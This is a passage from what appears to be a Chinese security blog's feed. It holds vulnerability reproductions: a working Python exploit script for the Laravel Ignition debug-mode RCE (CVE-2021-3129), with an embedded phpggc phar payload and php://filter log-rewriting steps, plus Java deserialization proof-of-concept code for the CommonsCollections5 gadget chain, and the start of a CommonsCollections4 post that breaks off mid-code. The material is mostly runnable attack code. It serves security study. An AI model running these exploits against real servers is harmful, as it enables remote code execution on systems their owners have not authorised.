class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>237<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;phar:///home/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log/test.txt&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功触发：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/24.png"></p><h1 id="3-利用脚本"><a href="#3-利用脚本" class="headerlink" title="3.利用脚本"></a>3.利用脚本</h1><p>我将日志文件转换成phar文件并进行反序列化操作写成python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment">#首先需要使用phpggc工具生成base64格式的payload：php -d&#x27;phar.readonly=0&#x27; ./phpggc monolog/rce1 system ifconfig --phar phar -o php://output | base64</span><br><span class="hljs-comment">#该方法用来将base64的payload进行字符集转换</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CreatePayload</span>():</span><br>    payload = <span class="hljs-string">&#x27;&#x27;&#x27;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQq9AgAAAgAAABEAAAABAAAAAABmAgAATzozMjoi</span><br><span class="hljs-string">TW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5</span><br><span class="hljs-string">OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7Tzoy</span><br><span class="hljs-string">OToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047</span><br><span class="hljs-string">czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntp</span><br><span class="hljs-string">OjA7czoyOiJpZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5p</span><br><span class="hljs-string">dGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNz</span><br><span class="hljs-string">b3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX1zOjEzOiIAKgBi</span><br><span class="hljs-string">dWZmZXJTaXplIjtpOi0xO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjI6e2k6MDtzOjI6Imlk</span><br><span class="hljs-string">IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7</span><br><span class="hljs-string">YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7</span><br><span class="hljs-string">aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0FAAAAZHVtbXkEAAAAS8fEYAQA</span><br><span class="hljs-string">AAAMfn/YpAEAAAAAAAAIAAAAdGVzdC50eHQEAAAAS8fEYAQAAAAMfn/YpAEAAAAAAAB0ZXN0dGVz</span><br><span class="hljs-string">dGAgCqgiRkqMTJN8uEIALfT7e2IlAgAAAEdCTUI=&#x27;&#x27;&#x27;</span> <span class="hljs-comment"># base64 payload</span><br>    armedPayload = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>        i = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(i.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()<br>        armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><br>    lastpayload = <span class="hljs-string">&quot;AAAAAAAAAAAAAAA&quot;</span>+armedPayload<span class="hljs-comment">#前面加15个字符</span><br>    <span class="hljs-keyword">return</span> lastpayload<br><br><span class="hljs-comment">#发送payload到目标</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RequestTarget</span>(<span class="hljs-params">url,viewFileData</span>):</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br>    &#125;<br>    payload = &#123;<br>        <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>        <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>        <span class="hljs-string">&quot;viewFile&quot;</span>: viewFileData<br>        &#125;<br>    &#125;<br>    r = requests.post(url,data = json.dumps(payload),headers = headers)<br>    print(r.status_code)<br>    <span class="hljs-keyword">return</span> r.text<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8000/_ignition/execute-solution&quot;</span><br>    clearCommand = <span class="hljs-string">&quot;php://filter/read=consumed/resource=/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log&quot;</span><br>    putAACommand = <span class="hljs-string">&quot;AA&quot;</span><br>    payload = CreatePayload()<br>    changeLogTopharCmd = <span class="hljs-string">&quot;php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log&quot;</span><br>    pharunserialCmd = <span class="hljs-string">&quot;phar:///home/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log/test.txt&quot;</span><br>    <span class="hljs-comment">#清空日志文件</span><br>    RequestTarget(url,clearCommand)<br>    <span class="hljs-comment">#添加AA前缀，用于对齐，因为我们发送的数据不一定是偶数。</span><br>    RequestTarget(url, putAACommand)<br>    <span class="hljs-comment">#写入payload</span><br>    RequestTarget(url, payload)<br>    <span class="hljs-comment">#将日志文件转换成phar格式</span><br>    RequestTarget(url, changeLogTopharCmd)<br>    <span class="hljs-comment">#phar反序列化操作</span><br>    result = RequestTarget(url, pharunserialCmd)<br>    indexof =<span class="hljs-built_in">int</span>(result.find(<span class="hljs-string">&quot;&lt;!doctype html&gt;&quot;</span>)) <br>    print(result[<span class="hljs-number">0</span>:indexof])<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/25.png"></p><h1 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h1><p><a href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/14702897.html">https://www.cnblogs.com/zpchcbd/p/14702897.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在CISCN2021的线上初赛有一道题就是利用&lt;code&gt;file_get_contents&lt;/code&gt;反序列化</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://reader-l.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections5利用链分析学习</title>
    <link href="https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
    <id>https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-17T08:04:10.000Z</published>
    <updated>2021-05-17T09:03:03.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>学习<code>CommonsCollections1</code>之后，我们知道该利用链是通过<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类的下的<code>invoke</code>方法来调用到<code>LazyMap#get</code>:</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/1.png"></p><p>而<code>CommonsCollections5</code>则是找到其他调用到<code>LazyMap#get</code>的方法，这就是这次学习的重点。</p><h1 id="2-限制条件"><a href="#2-限制条件" class="headerlink" title="2.限制条件"></a>2.限制条件</h1><h2 id="利用版本："><a href="#利用版本：" class="headerlink" title="利用版本："></a>利用版本：</h2><p>CommonsCollections 3.1 - 3.2.1</p><h2 id="JDK限制版本："><a href="#JDK限制版本：" class="headerlink" title="JDK限制版本："></a>JDK限制版本：</h2><p>JDK版本：java 7是不行的。</p><h1 id="3-利用链分析"><a href="#3-利用链分析" class="headerlink" title="3.利用链分析"></a>3.利用链分析</h1><p><code>Gadget chain</code>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">        ObjectInputStream.readObject()</span><br><span class="hljs-comment">            BadAttributeValueExpException.readObject()</span><br><span class="hljs-comment">                TiedMapEntry.toString()</span><br><span class="hljs-comment">                    LazyMap.get()</span><br><span class="hljs-comment">                        ChainedTransformer.transform()</span><br><span class="hljs-comment">                            ConstantTransformer.transform()</span><br><span class="hljs-comment">                            InvokerTransformer.transform()</span><br><span class="hljs-comment">                                Method.invoke()</span><br><span class="hljs-comment">                                    Class.getMethod()</span><br><span class="hljs-comment">                            InvokerTransformer.transform()</span><br><span class="hljs-comment">                                Method.invoke()</span><br><span class="hljs-comment">                                    Runtime.getRuntime()</span><br><span class="hljs-comment">                            InvokerTransformer.transform()</span><br><span class="hljs-comment">                                Method.invoke()</span><br><span class="hljs-comment">                                    Runtime.exec()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Requires:</span><br><span class="hljs-comment">commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>看完<code>Gadget chain</code>，可以发现该链的与<code>CommonsCollections1</code>的不同就是在这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*BadAttributeValueExpException.readObject()</span><br><span class="hljs-comment">                TiedMapEntry.toString()</span><br><span class="hljs-comment">                    LazyMap.get()</span><br></code></pre></td></tr></table></figure><p>跟进<code>TiedMapEntry</code>类进行查看：</p><p>​    可以发现通过该类的构造函数，我们可以控制<code>this.map</code>被赋值成<code>LazyMap</code>对象，只要再调用<code>getValue</code>方法的话，则可以触发<code>LazyMap#get</code>了。</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/2.png"></p><p>接下来我们需要去找到哪里会调用<code>getValue</code>方法，正好在<code>TiedMapEntry</code>类下<code>toString</code>方法正好调用<code>getValue</code>方法。</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/3.png"></p><p>demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> String[] &#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span> &#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outtermap = LazyMap.decorate(innermap,chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outtermap,<span class="hljs-number">1</span>);<br>        tiedMapEntry.toString();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功触发计算器。</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/4.png"></p><p>但这还不够好，我们希望的是目标反序列化后直接触发命令的执行，因此我们需要找到一个类在反序列化后会直接触发<code>toString</code>从而触发命令的执行。</p><p>从<code>Gadget chain</code>可以看到yso的作者是利用<code>BadAttributeValueExpException.readObject()</code>来达到以上目的的。</p><p>跟进这个类进行查看：发现get函数获取 val 的值然后赋给<code>valObj</code>，然后在符合 第二个<code>else if</code> 的情况下就会调用 <code>toString</code>。<code>val</code> 可以通过反射修改 ，同时 <code>System.getSecurityManager() </code>返回值也默认为 null ，这样我们就可以进入 else if 从而触发代码了。</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/5.png"></p><h1 id="4-反序列化利用链POC"><a href="#4-反序列化利用链POC" class="headerlink" title="4.反序列化利用链POC"></a>4.反序列化利用链POC</h1><p>根据上面的分析，构造POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> String[] &#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span> &#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outtermap = LazyMap.decorate(innermap,chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outtermap,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//        tiedMapEntry.toString();</span><br>        BadAttributeValueExpException poc = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-number">1</span>);<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        Field val = clazz.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-keyword">true</span>);<br>        val.set(poc,tiedMapEntry);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(poc);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功触发：</p><p><img src="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;学习&lt;code&gt;CommonsCollections1&lt;/code&gt;之后，我们知道该利用链是通过&lt;code&gt;sun.refl</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections4利用链分析学习</title>
    <link href="https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
    <id>https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-17T06:21:28.000Z</published>
    <updated>2021-05-17T07:37:46.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在查看<code>ysoserial</code>里面的CommonsCollections4的利用链后，我个人感觉它是cc2链和cc3链的结合。</p><h1 id="2-利用链限制条件"><a href="#2-利用链限制条件" class="headerlink" title="2.利用链限制条件"></a>2.利用链限制条件</h1><h4 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h4><p>CommonsCollections 4.0</p><h4 id="JDK限制"><a href="#JDK限制" class="headerlink" title="JDK限制"></a>JDK限制</h4><p>JDK版本：暂无限制</p><h1 id="3-利用链构造"><a href="#3-利用链构造" class="headerlink" title="3.利用链构造"></a>3.利用链构造</h1><p>​    该利用链沿用了CC3链利用<code>TrAXFilter</code>类的构造函数去触发<code>TemplatesImpl#newTransformer</code>加载恶意字节码的方法，沿用了CC2链通过<code>PriorityQueue</code>触发<code>TransformingComparator.compare()</code>进而调用传入的<code>transformer</code>对象的<code>transform</code>方法。</p><p>POC:</p><p>该POC是我根据cc2和cc3链组合起来的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, 